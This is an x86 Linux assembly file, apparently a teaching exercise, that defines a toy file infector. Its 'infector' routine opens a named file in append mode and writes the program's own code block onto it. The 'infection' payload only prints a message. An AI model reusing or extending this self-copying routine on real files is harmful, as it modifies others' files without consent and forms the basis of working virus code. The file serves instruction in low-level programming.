section .data
    msg db 'Hello, Infected file', 0xA 
    new_line db 0xA

section .text
global _start
global system_call
global infection
global infector
extern main
extern strlen

_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop

system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller


code_start:

infection:

    mov eax, 4 ; sys_write
    mov ebx, 1 ; stdout
    mov ecx, msg ; address of the string
    mov edx, 21 ; length of the string
    int 0x80

    ret

infector:

    push ebp             
    mov ebp, esp        
    mov ecx, [ebp + 8]

    mov ebx, 1 ; stdout

    ;printin the file name
    push ecx           ; Save the pointer to the string
    call strlen        ; Get the length of the string
    mov edx, eax       ; Move the length to edx
    pop ecx            ; Restore the pointer to the string
    mov eax, 4         ; sys_write
    int 0x80

    ;Check if there was an error
    cmp eax, -1 
    je error 

    ;Opening the file
    mov eax, 5 ; sys_open
    mov ebx, ecx ; filename
    mov ecx, 1025 ; O_WRONLY | O_APPEND
    mov edx, 511
    int 0x80

    ;Check if there was an error
    cmp eax, -1 
    je error 

    ;Writing the infection code to the file
    mov ebx, eax ; file descriptor
    mov eax, 4 ; sys_write
    mov ecx, code_start ; address of the string
    mov edx, code_end 
    sub edx, code_start ; length of the string
    int 0x80

    ;Check if there was an error
    cmp eax, -1 
    je error 

    ;Closing the file
    mov eax, 6
    int 0x80

    ;Check if there was an error
    cmp eax, -1 
    je error 

    mov eax, 4 ; sys_write
    mov ebx, 1 ; stdout
    mov ecx, new_line ; address of the string
    mov edx, 1 ; length of the string
    int 0x80

    ;Check if there was an error
    cmp eax, -1 
    je error 

    pop ebp
    ret

error:
    mov eax, 1 ; sys_exit
    mov ebx, 0x55 ; exit code
    int 0x80 ; Exit

code_end:
       

